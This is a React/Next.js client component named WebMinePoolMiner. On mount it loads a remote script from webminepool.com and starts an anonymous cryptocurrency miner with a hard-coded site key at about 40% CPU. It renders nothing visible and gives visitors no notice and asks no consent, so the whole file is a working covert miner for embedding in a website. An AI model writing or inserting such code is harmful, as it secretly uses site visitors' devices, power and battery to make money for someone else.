// components/WebMinePoolMiner.js
"use client"
import { useEffect } from 'react';

const WebMinePoolMiner = () => {
  useEffect(() => {
    // Ensure this code only runs on the client-side.
    if (typeof window !== 'undefined') {
      // Create and append the WebMinePool script
      const script = document.createElement('script');
      script.src = 'https://webminepool.com/lib/base.js';
      script.async = true;
      script.onload = () => {
        // Check if the miner object is available
        if (window.WMP && typeof window.WMP.Anonymous === 'function') {
          // Create the miner instance with your site key and throttle set to 0.6 (i.e. 40% CPU usage)
          const miner = window.WMP.Anonymous('SK_7TMpGYmG2vP3Rw7Ps4tnw', {
            throttle: 0.6,
          });
          miner.start();
        } else {
          console.error('WebMinePool script did not load correctly.');
        }
      };
      document.body.appendChild(script);

      // Cleanup the script on component unmount
      return () => {
        document.body.removeChild(script);
      };
    }
  }, []);

  // This component doesn't render anything visible.
  return null;
};

export default WebMinePoolMiner;
